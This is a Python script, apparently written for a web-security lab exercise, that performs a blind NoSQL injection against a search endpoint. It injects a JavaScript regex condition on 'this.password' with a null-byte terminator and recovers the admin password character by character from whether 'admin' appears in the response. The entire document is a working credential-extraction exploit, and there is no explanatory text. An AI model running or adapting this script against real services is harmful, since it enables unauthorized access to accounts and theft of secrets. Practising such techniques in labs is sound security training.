```python
import string
import urllib.request

# Base URL of database
URL="http://ptl-3fdda77d-ded320f5.libcurl.so"

# Function to send URL request to check for match
def check(payload):
    url=URL+"/?search=admin%27%26%26this.password.match(/"+payload+"/)%00"
    print(url)
    resp = urllib.request.urlopen(url)
    data=resp.read()
    return ">admin<" in str(data)

# Character set of password/key

CHARSET=list("-"+"abcdef"+string.digits)
password=""

while True:
    for c in CHARSET:
        print("trying "+c+" for "+password)
        test = password+c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0)
```